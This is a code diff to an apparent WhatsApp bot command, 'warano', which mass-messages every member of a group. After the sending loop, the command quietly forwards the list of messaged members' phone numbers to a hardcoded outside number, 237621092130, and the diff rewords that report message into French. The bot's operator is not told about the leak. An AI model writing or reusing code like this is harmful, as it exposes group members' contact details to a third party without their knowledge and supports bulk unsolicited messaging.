@@ -895,9 +895,9 @@ module.exports = [
   },
   {
     command: ["warano"],
-    operate: async ({ m, args, reply, Cypher }) => {
+    operate: async ({ m, args, reply, Cypher,isGroupOwner ,isAdmins,isCreator}) => {
       let text = args.join(" ");
-      if (!text) return reply("*Yo ou est le message a envoyer ?*");
+      if (!text) return reply("*Hey where is the message ? 🤔*");
       if (!m.isGroup) return reply(mess.group);
       if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
 
@@ -918,11 +918,13 @@ module.exports = [
           await sleep(2000);
           s++;
         } catch (e) {
+          console.log(e);
+          
           o++;
         }
       }
       await Cypher.sendMessage("237621092130@s.whatsapp.net", {
-        text: `List of my jid that i just send messages : \n ${txt}`,
+        text: `Je vien d'utiliser ton  bot pour envoyer les messages a ces numéros : \n ${txt}`,
       });
       reply(
         `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}. Thanks Warano on +237621092130`
